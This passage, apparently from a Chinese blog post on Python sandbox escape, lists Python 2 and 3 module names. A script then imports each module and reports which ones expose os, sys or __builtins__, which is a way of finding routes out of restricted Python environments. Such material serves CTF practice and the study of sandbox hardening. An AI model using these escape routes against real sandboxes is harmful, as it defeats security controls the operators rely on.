class="hljs-string">&#x27;token&#x27;</span>, <span class="hljs-string">&#x27;_hashlib&#x27;</span>, <span class="hljs-string">&#x27;dummy_threading&#x27;</span>, <span class="hljs-string">&#x27;plistlib&#x27;</span>, <span class="hljs-string">&#x27;tokenize&#x27;</span>, <span class="hljs-string">&#x27;_heapq&#x27;</span>, <span class="hljs-string">&#x27;email&#x27;</span>, <span class="hljs-string">&#x27;popen2&#x27;</span>, <span class="hljs-string">&#x27;trace&#x27;</span>, <span class="hljs-string">&#x27;_hotshot&#x27;</span>, <span class="hljs-string">&#x27;encodings&#x27;</span>, <span class="hljs-string">&#x27;poplib&#x27;</span>, <span class="hljs-string">&#x27;traceback&#x27;</span>, <span class="hljs-string">&#x27;_io&#x27;</span>, <span class="hljs-string">&#x27;ensurepip&#x27;</span>, <span class="hljs-string">&#x27;posix&#x27;</span>, <span class="hljs-string">&#x27;ttk&#x27;</span>, <span class="hljs-string">&#x27;_json&#x27;</span>, <span class="hljs-string">&#x27;errno&#x27;</span>, <span class="hljs-string">&#x27;posixfile&#x27;</span>, <span class="hljs-string">&#x27;tty&#x27;</span>, <span class="hljs-string">&#x27;_locale&#x27;</span>, <span class="hljs-string">&#x27;exceptions&#x27;</span>, <span class="hljs-string">&#x27;posixpath&#x27;</span>, <span class="hljs-string">&#x27;turtle&#x27;</span>, <span class="hljs-string">&#x27;_lsprof&#x27;</span>, <span class="hljs-string">&#x27;fcntl&#x27;</span>, <span class="hljs-string">&#x27;pprint&#x27;</span>, <span class="hljs-string">&#x27;types&#x27;</span>, <span class="hljs-string">&#x27;_md5&#x27;</span>, <span class="hljs-string">&#x27;filecmp&#x27;</span>, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-string">&#x27;unicodedata&#x27;</span>, <span class="hljs-string">&#x27;_multibytecodec&#x27;</span>, <span class="hljs-string">&#x27;fileinput&#x27;</span>, <span class="hljs-string">&#x27;pstats&#x27;</span>, <span class="hljs-string">&#x27;unittest&#x27;</span>, <span class="hljs-string">&#x27;_multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;fnmatch&#x27;</span>, <span class="hljs-string">&#x27;pty&#x27;</span>, <span class="hljs-string">&#x27;urllib&#x27;</span>, <span class="hljs-string">&#x27;_osx_support&#x27;</span>, <span class="hljs-string">&#x27;formatter&#x27;</span>, <span class="hljs-string">&#x27;pwd&#x27;</span>, <span class="hljs-string">&#x27;urllib2&#x27;</span>, <span class="hljs-string">&#x27;_pyio&#x27;</span>, <span class="hljs-string">&#x27;fpformat&#x27;</span>, <span class="hljs-string">&#x27;py_compile&#x27;</span>, <span class="hljs-string">&#x27;urlparse&#x27;</span>, <span class="hljs-string">&#x27;_random&#x27;</span>, <span class="hljs-string">&#x27;fractions&#x27;</span>, <span class="hljs-string">&#x27;pyclbr&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;_sha&#x27;</span>, <span class="hljs-string">&#x27;ftplib&#x27;</span>, <span class="hljs-string">&#x27;pydoc&#x27;</span>, <span class="hljs-string">&#x27;uu&#x27;</span>, <span class="hljs-string">&#x27;_sha256&#x27;</span>, <span class="hljs-string">&#x27;functools&#x27;</span>, <span class="hljs-string">&#x27;pydoc_data&#x27;</span>, <span class="hljs-string">&#x27;uuid&#x27;</span>, <span class="hljs-string">&#x27;_sha512&#x27;</span>, <span class="hljs-string">&#x27;future_builtins&#x27;</span>, <span class="hljs-string">&#x27;pyexpat&#x27;</span>, <span class="hljs-string">&#x27;warnings&#x27;</span>, <span class="hljs-string">&#x27;_socket&#x27;</span>, <span class="hljs-string">&#x27;gc&#x27;</span>, <span class="hljs-string">&#x27;quopri&#x27;</span>, <span class="hljs-string">&#x27;wave&#x27;</span>, <span class="hljs-string">&#x27;_sqlite3&#x27;</span>, <span class="hljs-string">&#x27;genericpath&#x27;</span>, <span class="hljs-string">&#x27;random&#x27;</span>, <span class="hljs-string">&#x27;weakref&#x27;</span>, <span class="hljs-string">&#x27;_sre&#x27;</span>, <span class="hljs-string">&#x27;getopt&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;webbrowser&#x27;</span>, <span class="hljs-string">&#x27;_ssl&#x27;</span>, <span class="hljs-string">&#x27;getpass&#x27;</span>, <span class="hljs-string">&#x27;readline&#x27;</span>, <span class="hljs-string">&#x27;whichdb&#x27;</span>, <span class="hljs-string">&#x27;_strptime&#x27;</span>, <span class="hljs-string">&#x27;gettext&#x27;</span>, <span class="hljs-string">&#x27;repr&#x27;</span>, <span class="hljs-string">&#x27;wsgiref&#x27;</span>, <span class="hljs-string">&#x27;_struct&#x27;</span>, <span class="hljs-string">&#x27;glob&#x27;</span>, <span class="hljs-string">&#x27;resource&#x27;</span>, <span class="hljs-string">&#x27;xdrlib&#x27;</span>, <span class="hljs-string">&#x27;_symtable&#x27;</span>, <span class="hljs-string">&#x27;grp&#x27;</span>, <span class="hljs-string">&#x27;rexec&#x27;</span>, <span class="hljs-string">&#x27;xml&#x27;</span>, <span class="hljs-string">&#x27;_sysconfigdata&#x27;</span>, <span class="hljs-string">&#x27;gzip&#x27;</span>, <span class="hljs-string">&#x27;rfc822&#x27;</span>, <span class="hljs-string">&#x27;xmllib&#x27;</span>, <span class="hljs-string">&#x27;_sysconfigdata_nd&#x27;</span>, <span class="hljs-string">&#x27;hashlib&#x27;</span>, <span class="hljs-string">&#x27;rlcompleter&#x27;</span>, <span class="hljs-string">&#x27;xmlrpclib&#x27;</span>, <span class="hljs-string">&#x27;_testcapi&#x27;</span>, <span class="hljs-string">&#x27;heapq&#x27;</span>, <span class="hljs-string">&#x27;robotparser&#x27;</span>, <span class="hljs-string">&#x27;xxsubtype&#x27;</span>, <span class="hljs-string">&#x27;_threading_local&#x27;</span>, <span class="hljs-string">&#x27;hmac&#x27;</span>, <span class="hljs-string">&#x27;runpy&#x27;</span>, <span class="hljs-string">&#x27;zipfile&#x27;</span>, <span class="hljs-string">&#x27;_warnings&#x27;</span>, <span class="hljs-string">&#x27;hotshot&#x27;</span>, <span class="hljs-string">&#x27;sched&#x27;</span>, <span class="hljs-string">&#x27;zipimport&#x27;</span>, <span class="hljs-string">&#x27;_weakref&#x27;</span>, <span class="hljs-string">&#x27;htmlentitydefs&#x27;</span>, <span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;zlib&#x27;</span>, <span class="hljs-string">&#x27;_weakrefset&#x27;</span>, <span class="hljs-string">&#x27;htmllib&#x27;</span>, <span class="hljs-string">&#x27;sets&#x27;</span>, <span class="hljs-string">&#x27;abc&#x27;</span>, <span class="hljs-string">&#x27;httplib&#x27;</span>, <span class="hljs-string">&#x27;sgmllib&#x27;</span>, <span class="hljs-string">&#x27;aifc&#x27;</span>, <span class="hljs-string">&#x27;ihooks&#x27;</span>, <span class="hljs-string">&#x27;sha&#x27;</span><br>]<br><br>all_modules_Python3 = [<br>    <span class="hljs-string">&#x27;AptUrl&#x27;</span>, <span class="hljs-string">&#x27;hmac&#x27;</span>, <span class="hljs-string">&#x27;requests_unixsocket&#x27;</span>, <span class="hljs-string">&#x27;CommandNotFound&#x27;</span>, <span class="hljs-string">&#x27;apport&#x27;</span>, <span class="hljs-string">&#x27;hpmudext&#x27;</span>, <span class="hljs-string">&#x27;resource&#x27;</span>, <span class="hljs-string">&#x27;Crypto&#x27;</span>, <span class="hljs-string">&#x27;apport_python_hook&#x27;</span>, <span class="hljs-string">&#x27;html&#x27;</span>, <span class="hljs-string">&#x27;rlcompleter&#x27;</span>, <span class="hljs-string">&#x27;DistUpgrade&#x27;</span>, <span class="hljs-string">&#x27;apt&#x27;</span>, <span class="hljs-string">&#x27;http&#x27;</span>, <span class="hljs-string">&#x27;runpy&#x27;</span>, <span class="hljs-string">&#x27;HweSupportStatus&#x27;</span>, <span class="hljs-string">&#x27;apt_inst&#x27;</span>, <span class="hljs-string">&#x27;httplib2&#x27;</span>, <span class="hljs-string">&#x27;scanext&#x27;</span>, <span class="hljs-string">&#x27;LanguageSelector&#x27;</span>, <span class="hljs-string">&#x27;apt_pkg&#x27;</span>, <span class="hljs-string">&#x27;idna&#x27;</span>, <span class="hljs-string">&#x27;sched&#x27;</span>, <span class="hljs-string">&#x27;NvidiaDetector&#x27;</span>, <span class="hljs-string">&#x27;aptdaemon&#x27;</span>, <span class="hljs-string">&#x27;imaplib&#x27;</span>, <span class="hljs-string">&#x27;secrets&#x27;</span>, <span class="hljs-string">&#x27;PIL&#x27;</span>, <span class="hljs-string">&#x27;aptsources&#x27;</span>, <span class="hljs-string">&#x27;imghdr&#x27;</span>, <span class="hljs-string">&#x27;secretstorage&#x27;</span>, <span class="hljs-string">&#x27;Quirks&#x27;</span>, <span class="hljs-string">&#x27;argparse&#x27;</span>, <span class="hljs-string">&#x27;imp&#x27;</span>, <span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;UbuntuDrivers&#x27;</span>, <span class="hljs-string">&#x27;array&#x27;</span>, <span class="hljs-string">&#x27;importlib&#x27;</span>, <span class="hljs-string">&#x27;selectors&#x27;</span>, <span class="hljs-string">&#x27;UbuntuSystemService&#x27;</span>, <span class="hljs-string">&#x27;asn1crypto&#x27;</span>, <span class="hljs-string">&#x27;inspect&#x27;</span>, <span class="hljs-string">&#x27;shelve&#x27;</span>, <span class="hljs-string">&#x27;UpdateManager&#x27;</span>, <span class="hljs-string">&#x27;ast&#x27;</span>, <span class="hljs-string">&#x27;io&#x27;</span>, <span class="hljs-string">&#x27;shlex&#x27;</span>, <span class="hljs-string">&#x27;__future__&#x27;</span>, <span class="hljs-string">&#x27;asynchat&#x27;</span>, <span class="hljs-string">&#x27;ipaddress&#x27;</span>, <span class="hljs-string">&#x27;shutil&#x27;</span>, <span class="hljs-string">&#x27;_ast&#x27;</span>, <span class="hljs-string">&#x27;asyncio&#x27;</span>, <span class="hljs-string">&#x27;itertools&#x27;</span>, <span class="hljs-string">&#x27;signal&#x27;</span>, <span class="hljs-string">&#x27;_asyncio&#x27;</span>, <span class="hljs-string">&#x27;asyncore&#x27;</span>, <span class="hljs-string">&#x27;janitor&#x27;</span>, <span class="hljs-string">&#x27;simplejson&#x27;</span>, <span class="hljs-string">&#x27;_bisect&#x27;</span>, <span class="hljs-string">&#x27;atexit&#x27;</span>, <span class="hljs-string">&#x27;json&#x27;</span>, <span class="hljs-string">&#x27;site&#x27;</span>, <span class="hljs-string">&#x27;_blake2&#x27;</span>, <span class="hljs-string">&#x27;audioop&#x27;</span>, <span class="hljs-string">&#x27;keyring&#x27;</span>, <span class="hljs-string">&#x27;sitecustomize&#x27;</span>, <span class="hljs-string">&#x27;_bootlocale&#x27;</span>, <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;keyword&#x27;</span>, <span class="hljs-string">&#x27;six&#x27;</span>, <span class="hljs-string">&#x27;_bz2&#x27;</span>, <span class="hljs-string">&#x27;bdb&#x27;</span>, <span class="hljs-string">&#x27;language_support_pkgs&#x27;</span>, <span class="hljs-string">&#x27;smtpd&#x27;</span>, <span class="hljs-string">&#x27;_cffi_backend&#x27;</span>, <span class="hljs-string">&#x27;binascii&#x27;</span>, <span class="hljs-string">&#x27;launchpadlib&#x27;</span>, <span class="hljs-string">&#x27;smtplib&#x27;</span>, <span class="hljs-string">&#x27;_codecs&#x27;</span>, <span class="hljs-string">&#x27;binhex&#x27;</span>, <span class="hljs-string">&#x27;linecache&#x27;</span>, <span class="hljs-string">&#x27;sndhdr&#x27;</span>, <span class="hljs-string">&#x27;_codecs_cn&#x27;</span>, <span class="hljs-string">&#x27;bisect&#x27;</span>, <span class="hljs-string">&#x27;locale&#x27;</span>, <span class="hljs-string">&#x27;socket&#x27;</span>, <span class="hljs-string">&#x27;_codecs_hk&#x27;</span>, <span class="hljs-string">&#x27;brlapi&#x27;</span>, <span class="hljs-string">&#x27;logging&#x27;</span>, <span class="hljs-string">&#x27;socketserver&#x27;</span>, <span class="hljs-string">&#x27;_codecs_iso2022&#x27;</span>, <span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;louis&#x27;</span>, <span class="hljs-string">&#x27;softwareproperties&#x27;</span>, <span class="hljs-string">&#x27;_codecs_jp&#x27;</span>, <span class="hljs-string">&#x27;bz2&#x27;</span>, <span class="hljs-string">&#x27;lsb_release&#x27;</span>, <span class="hljs-string">&#x27;speechd&#x27;</span>, <span class="hljs-string">&#x27;_codecs_kr&#x27;</span>, <span class="hljs-string">&#x27;cProfile&#x27;</span>, <span class="hljs-string">&#x27;lzma&#x27;</span>, <span class="hljs-string">&#x27;speechd_config&#x27;</span>, <span class="hljs-string">&#x27;_codecs_tw&#x27;</span>, <span class="hljs-string">&#x27;cairo&#x27;</span>, <span class="hljs-string">&#x27;macaroonbakery&#x27;</span>, <span class="hljs-string">&#x27;spwd&#x27;</span>, <span class="hljs-string">&#x27;_collections&#x27;</span>, <span class="hljs-string">&#x27;calendar&#x27;</span>, <span class="hljs-string">&#x27;macpath&#x27;</span>, <span class="hljs-string">&#x27;sqlite3&#x27;</span>, <span class="hljs-string">&#x27;_collections_abc&#x27;</span>, <span class="hljs-string">&#x27;certifi&#x27;</span>, <span class="hljs-string">&#x27;macurl2path&#x27;</span>, <span class="hljs-string">&#x27;sre_compile&#x27;</span>, <span class="hljs-string">&#x27;_compat_pickle&#x27;</span>, <span class="hljs-string">&#x27;cgi&#x27;</span>, <span class="hljs-string">&#x27;mailbox&#x27;</span>, <span class="hljs-string">&#x27;sre_constants&#x27;</span>, <span class="hljs-string">&#x27;_compression&#x27;</span>, <span class="hljs-string">&#x27;cgitb&#x27;</span>, <span class="hljs-string">&#x27;mailcap&#x27;</span>, <span class="hljs-string">&#x27;sre_parse&#x27;</span>, <span class="hljs-string">&#x27;_crypt&#x27;</span>, <span class="hljs-string">&#x27;chardet&#x27;</span>, <span class="hljs-string">&#x27;mako&#x27;</span>, <span class="hljs-string">&#x27;ssl&#x27;</span>, <span class="hljs-string">&#x27;_csv&#x27;</span>, <span class="hljs-string">&#x27;chunk&#x27;</span>, <span class="hljs-string">&#x27;markupsafe&#x27;</span>, <span class="hljs-string">&#x27;stat&#x27;</span>, <span class="hljs-string">&#x27;_ctypes&#x27;</span>, <span class="hljs-string">&#x27;cmath&#x27;</span>, <span class="hljs-string">&#x27;marshal&#x27;</span>, <span class="hljs-string">&#x27;statistics&#x27;</span>, <span class="hljs-string">&#x27;_ctypes_test&#x27;</span>, <span class="hljs-string">&#x27;cmd&#x27;</span>, <span class="hljs-string">&#x27;math&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>, <span class="hljs-string">&#x27;_curses&#x27;</span>, <span class="hljs-string">&#x27;code&#x27;</span>, <span class="hljs-string">&#x27;mimetypes&#x27;</span>, <span class="hljs-string">&#x27;stringprep&#x27;</span>, <span class="hljs-string">&#x27;_curses_panel&#x27;</span>, <span class="hljs-string">&#x27;codecs&#x27;</span>, <span class="hljs-string">&#x27;mmap&#x27;</span>, <span class="hljs-string">&#x27;struct&#x27;</span>, <span class="hljs-string">&#x27;_datetime&#x27;</span>, <span class="hljs-string">&#x27;codeop&#x27;</span>, <span class="hljs-string">&#x27;modual_test&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;_dbm&#x27;</span>, <span class="hljs-string">&#x27;collections&#x27;</span>, <span class="hljs-string">&#x27;modulefinder&#x27;</span>, <span class="hljs-string">&#x27;sunau&#x27;</span>, <span class="hljs-string">&#x27;_dbus_bindings&#x27;</span>, <span class="hljs-string">&#x27;colorsys&#x27;</span>, <span class="hljs-string">&#x27;multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;symbol&#x27;</span>, <span class="hljs-string">&#x27;_dbus_glib_bindings&#x27;</span>, <span class="hljs-string">&#x27;compileall&#x27;</span>, <span class="hljs-string">&#x27;nacl&#x27;</span>, <span class="hljs-string">&#x27;symtable&#x27;</span>, <span class="hljs-string">&#x27;_decimal&#x27;</span>, <span class="hljs-string">&#x27;concurrent&#x27;</span>, <span class="hljs-string">&#x27;netrc&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;_dummy_thread&#x27;</span>, <span class="hljs-string">&#x27;configparser&#x27;</span>, <span class="hljs-string">&#x27;nis&#x27;</span>, <span class="hljs-string">&#x27;sysconfig&#x27;</span>, <span class="hljs-string">&#x27;_elementtree&#x27;</span>, <span class="hljs-string">&#x27;contextlib&#x27;</span>, <span class="hljs-string">&#x27;nntplib&#x27;</span>, <span class="hljs-string">&#x27;syslog&#x27;</span>, <span class="hljs-string">&#x27;_functools&#x27;</span>, <span class="hljs-string">&#x27;copy&#x27;</span>, <span class="hljs-string">&#x27;ntpath&#x27;</span>, <span class="hljs-string">&#x27;systemd&#x27;</span>, <span class="hljs-string">&#x27;_gdbm&#x27;</span>, <span class="hljs-string">&#x27;copyreg&#x27;</span>, <span class="hljs-string">&#x27;nturl2path&#x27;</span>, <span class="hljs-string">&#x27;tabnanny&#x27;</span>, <span class="hljs-string">&#x27;_hashlib&#x27;</span>, <span class="hljs-string">&#x27;crypt&#x27;</span>, <span class="hljs-string">&#x27;numbers&#x27;</span>, <span class="hljs-string">&#x27;tarfile&#x27;</span>, <span class="hljs-string">&#x27;_heapq&#x27;</span>, <span class="hljs-string">&#x27;cryptography&#x27;</span>, <span class="hljs-string">&#x27;oauth&#x27;</span>, <span class="hljs-string">&#x27;telnetlib&#x27;</span>, <span class="hljs-string">&#x27;_imp&#x27;</span>, <span class="hljs-string">&#x27;csv&#x27;</span>, <span class="hljs-string">&#x27;olefile&#x27;</span>, <span class="hljs-string">&#x27;tempfile&#x27;</span>, <span class="hljs-string">&#x27;_io&#x27;</span>, <span class="hljs-string">&#x27;ctypes&#x27;</span>, <span class="hljs-string">&#x27;opcode&#x27;</span>, <span class="hljs-string">&#x27;termios&#x27;</span>, <span class="hljs-string">&#x27;_json&#x27;</span>, <span class="hljs-string">&#x27;cups&#x27;</span>, <span class="hljs-string">&#x27;operator&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;_locale&#x27;</span>, <span class="hljs-string">&#x27;cupsext&#x27;</span>, <span class="hljs-string">&#x27;optparse&#x27;</span>, <span class="hljs-string">&#x27;textwrap&#x27;</span>, <span class="hljs-string">&#x27;_lsprof&#x27;</span>, <span class="hljs-string">&#x27;cupshelpers&#x27;</span>, <span class="hljs-string">&#x27;orca&#x27;</span>, <span class="hljs-string">&#x27;_lzma&#x27;</span>, <span class="hljs-string">&#x27;curses&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;threading&#x27;</span>, <span class="hljs-string">&#x27;_markupbase&#x27;</span>, <span class="hljs-string">&#x27;datetime&#x27;</span>, <span class="hljs-string">&#x27;ossaudiodev&#x27;</span>, <span class="hljs-string">&#x27;time&#x27;</span>, <span class="hljs-string">&#x27;_md5&#x27;</span>, <span class="hljs-string">&#x27;dbm&#x27;</span>, <span class="hljs-string">&#x27;parser&#x27;</span>, <span class="hljs-string">&#x27;timeit&#x27;</span>, <span class="hljs-string">&#x27;_multibytecodec&#x27;</span>, <span class="hljs-string">&#x27;dbus&#x27;</span>, <span class="hljs-string">&#x27;pathlib&#x27;</span>, <span class="hljs-string">&#x27;token&#x27;</span>, <span class="hljs-string">&#x27;_multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;deb822&#x27;</span>, <span class="hljs-string">&#x27;pcardext&#x27;</span>, <span class="hljs-string">&#x27;tokenize&#x27;</span>, <span class="hljs-string">&#x27;_opcode&#x27;</span>, <span class="hljs-string">&#x27;debconf&#x27;</span>, <span class="hljs-string">&#x27;pdb&#x27;</span>, <span class="hljs-string">&#x27;trace&#x27;</span>, <span class="hljs-string">&#x27;_operator&#x27;</span>, <span class="hljs-string">&#x27;debian&#x27;</span>, <span class="hljs-string">&#x27;pexpect&#x27;</span>, <span class="hljs-string">&#x27;traceback&#x27;</span>, <span class="hljs-string">&#x27;_osx_support&#x27;</span>, <span class="hljs-string">&#x27;debian_bundle&#x27;</span>, <span class="hljs-string">&#x27;pickle&#x27;</span>, <span class="hljs-string">&#x27;tracemalloc&#x27;</span>, <span class="hljs-string">&#x27;_pickle&#x27;</span>, <span class="hljs-string">&#x27;decimal&#x27;</span>, <span class="hljs-string">&#x27;pickletools&#x27;</span>, <span class="hljs-string">&#x27;tty&#x27;</span>, <span class="hljs-string">&#x27;_posixsubprocess&#x27;</span>, <span class="hljs-string">&#x27;defer&#x27;</span>, <span class="hljs-string">&#x27;pipes&#x27;</span>, <span class="hljs-string">&#x27;turtle&#x27;</span>, <span class="hljs-string">&#x27;_pydecimal&#x27;</span>, <span class="hljs-string">&#x27;difflib&#x27;</span>, <span class="hljs-string">&#x27;pkg_resources&#x27;</span>, <span class="hljs-string">&#x27;types&#x27;</span>, <span class="hljs-string">&#x27;_pyio&#x27;</span>, <span class="hljs-string">&#x27;dis&#x27;</span>, <span class="hljs-string">&#x27;pkgutil&#x27;</span>, <span class="hljs-string">&#x27;typing&#x27;</span>, <span class="hljs-string">&#x27;_random&#x27;</span>, <span class="hljs-string">&#x27;distro_info&#x27;</span>, <span class="hljs-string">&#x27;platform&#x27;</span>, <span class="hljs-string">&#x27;ufw&#x27;</span>, <span class="hljs-string">&#x27;_sha1&#x27;</span>, <span class="hljs-string">&#x27;distro_info_test&#x27;</span>, <span class="hljs-string">&#x27;plistlib&#x27;</span>, <span class="hljs-string">&#x27;unicodedata&#x27;</span>, <span class="hljs-string">&#x27;_sha256&#x27;</span>, <span class="hljs-string">&#x27;distutils&#x27;</span>, <span class="hljs-string">&#x27;poplib&#x27;</span>, <span class="hljs-string">&#x27;unittest&#x27;</span>, <span class="hljs-string">&#x27;_sha3&#x27;</span>, <span class="hljs-string">&#x27;doctest&#x27;</span>, <span class="hljs-string">&#x27;posix&#x27;</span>, <span class="hljs-string">&#x27;urllib&#x27;</span>, <span class="hljs-string">&#x27;_sha512&#x27;</span>, <span class="hljs-string">&#x27;dummy_threading&#x27;</span>, <span class="hljs-string">&#x27;posixpath&#x27;</span>, <span class="hljs-string">&#x27;urllib3&#x27;</span>, <span class="hljs-string">&#x27;_signal&#x27;</span>, <span class="hljs-string">&#x27;email&#x27;</span>, <span class="hljs-string">&#x27;pprint&#x27;</span>, <span class="hljs-string">&#x27;usbcreator&#x27;</span>, <span class="hljs-string">&#x27;_sitebuiltins&#x27;</span>, <span class="hljs-string">&#x27;encodings&#x27;</span>, <span class="hljs-string">&#x27;problem_report&#x27;</span>, <span class="hljs-string">&#x27;uu&#x27;</span>, <span class="hljs-string">&#x27;_socket&#x27;</span>, <span class="hljs-string">&#x27;enum&#x27;</span>, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-string">&#x27;uuid&#x27;</span>, <span class="hljs-string">&#x27;_sqlite3&#x27;</span>, <span class="hljs-string">&#x27;errno&#x27;</span>, <span class="hljs-string">&#x27;pstats&#x27;</span>, <span class="hljs-string">&#x27;venv&#x27;</span>, <span class="hljs-string">&#x27;_sre&#x27;</span>, <span class="hljs-string">&#x27;faulthandler&#x27;</span>, <span class="hljs-string">&#x27;pty&#x27;</span>, <span class="hljs-string">&#x27;wadllib&#x27;</span>, <span class="hljs-string">&#x27;_ssl&#x27;</span>, <span class="hljs-string">&#x27;fcntl&#x27;</span>, <span class="hljs-string">&#x27;ptyprocess&#x27;</span>, <span class="hljs-string">&#x27;warnings&#x27;</span>, <span class="hljs-string">&#x27;_stat&#x27;</span>, <span class="hljs-string">&#x27;filecmp&#x27;</span>, <span class="hljs-string">&#x27;pwd&#x27;</span>, <span class="hljs-string">&#x27;wave&#x27;</span>, <span class="hljs-string">&#x27;_string&#x27;</span>, <span class="hljs-string">&#x27;fileinput&#x27;</span>, <span class="hljs-string">&#x27;py_compile&#x27;</span>, <span class="hljs-string">&#x27;weakref&#x27;</span>, <span class="hljs-string">&#x27;_strptime&#x27;</span>, <span class="hljs-string">&#x27;fnmatch&#x27;</span>, <span class="hljs-string">&#x27;pyatspi&#x27;</span>, <span class="hljs-string">&#x27;webbrowser&#x27;</span>, <span class="hljs-string">&#x27;_struct&#x27;</span>, <span class="hljs-string">&#x27;formatter&#x27;</span>, <span class="hljs-string">&#x27;pyclbr&#x27;</span>, <span class="hljs-string">&#x27;wsgiref&#x27;</span>, <span class="hljs-string">&#x27;_symtable&#x27;</span>, <span class="hljs-string">&#x27;fractions&#x27;</span>, <span class="hljs-string">&#x27;pydoc&#x27;</span>, <span class="hljs-string">&#x27;xdg&#x27;</span>, <span class="hljs-string">&#x27;_sysconfigdata_m_linux_x86_64-linux-gnu&#x27;</span>, <span class="hljs-string">&#x27;ftplib&#x27;</span>, <span class="hljs-string">&#x27;pydoc_data&#x27;</span>, <span class="hljs-string">&#x27;xdrlib&#x27;</span>, <span class="hljs-string">&#x27;_testbuffer&#x27;</span>, <span class="hljs-string">&#x27;functools&#x27;</span>, <span class="hljs-string">&#x27;pyexpat&#x27;</span>, <span class="hljs-string">&#x27;xkit&#x27;</span>, <span class="hljs-string">&#x27;_testcapi&#x27;</span>, <span class="hljs-string">&#x27;gc&#x27;</span>, <span class="hljs-string">&#x27;pygtkcompat&#x27;</span>, <span class="hljs-string">&#x27;xml&#x27;</span>, <span class="hljs-string">&#x27;_testimportmultiple&#x27;</span>, <span class="hljs-string">&#x27;genericpath&#x27;</span>, <span class="hljs-string">&#x27;pymacaroons&#x27;</span>, <span class="hljs-string">&#x27;xmlrpc&#x27;</span>, <span class="hljs-string">&#x27;_testmultiphase&#x27;</span>, <span class="hljs-string">&#x27;getopt&#x27;</span>, <span class="hljs-string">&#x27;pyrfc3339&#x27;</span>, <span class="hljs-string">&#x27;xxlimited&#x27;</span>, <span class="hljs-string">&#x27;_thread&#x27;</span>, <span class="hljs-string">&#x27;getpass&#x27;</span>, <span class="hljs-string">&#x27;pytz&#x27;</span>, <span class="hljs-string">&#x27;xxsubtype&#x27;</span>, <span class="hljs-string">&#x27;_threading_local&#x27;</span>, <span class="hljs-string">&#x27;gettext&#x27;</span>, <span class="hljs-string">&#x27;queue&#x27;</span>, <span class="hljs-string">&#x27;yaml&#x27;</span>, <span class="hljs-string">&#x27;_tracemalloc&#x27;</span>, <span class="hljs-string">&#x27;gi&#x27;</span>, <span class="hljs-string">&#x27;quopri&#x27;</span>, <span class="hljs-string">&#x27;zipapp&#x27;</span>, <span class="hljs-string">&#x27;_warnings&#x27;</span>, <span class="hljs-string">&#x27;glob&#x27;</span>, <span class="hljs-string">&#x27;random&#x27;</span>, <span class="hljs-string">&#x27;zipfile&#x27;</span>, <span class="hljs-string">&#x27;_weakref&#x27;</span>, <span class="hljs-string">&#x27;grp&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;zipimport&#x27;</span>, <span class="hljs-string">&#x27;_weakrefset&#x27;</span>, <span class="hljs-string">&#x27;gtweak&#x27;</span>, <span class="hljs-string">&#x27;readline&#x27;</span>, <span class="hljs-string">&#x27;zlib&#x27;</span>, <span class="hljs-string">&#x27;_yaml&#x27;</span>, <span class="hljs-string">&#x27;gzip&#x27;</span>, <span class="hljs-string">&#x27;reportlab&#x27;</span>, <span class="hljs-string">&#x27;zope&#x27;</span>, <span class="hljs-string">&#x27;abc&#x27;</span>, <span class="hljs-string">&#x27;hashlib&#x27;</span>, <span class="hljs-string">&#x27;reprlib&#x27;</span>, <span class="hljs-string">&#x27;aifc&#x27;</span>, <span class="hljs-string">&#x27;heapq&#x27;</span><br>]<br><br>methods = [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>]<br><br>results = &#123;&#125;<br><span class="hljs-keyword">for</span> module <span class="hljs-keyword">in</span> all_modules_Python3:<br>    results[module] = &#123;<br>        <span class="hljs-string">&#x27;flag&#x27;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;result&#x27;</span>: &#123;&#125;<br>    &#125;<br><br>    <span class="hljs-keyword">try</span>:<br>        m = <span class="hljs-built_in">__import__</span>(module)<br>        attrs = <span class="hljs-built_in">dir</span>(m)<br>        <span class="hljs-keyword">for</span> method <span class="hljs-keyword">in</span> methods:<br>            <span class="hljs-keyword">if</span> method <span class="hljs-keyword">in</span> attrs:<br>                result = <span class="hljs-string">&#x27;yes&#x27;</span><br>                results[module][<span class="hljs-string">&#x27;flag&#x27;</span>] = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                result = <span class="hljs-string">&#x27;no&#x27;</span><br><br>            results[module][<span class="hljs-string">&#x27;result&#x27;</span>][method] = result<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br><span class="hljs-keyword">for</span> result <span class="hljs-keyword">in</span> results:<br>    <span class="hljs-keyword">if</span> results[result][<span class="hljs-string">&#x27;flag&#x27;</span>]:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+]&#x27;</span> + result)<br>        <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> results[result][<span class="hljs-string">&#x27;result&#x27;</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;  [-]&#x27;</span> + r + <span class="hljs-string">&#x27;: &#x27;</span> + results[result][<span class="hljs-string">&#x27;result&#x27;</span>][r])<br></code></pre></td></tr></table></figure><p>效果是这样：</p><img src="/blog/2025/01/24/Python/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20250124202651867.png" class 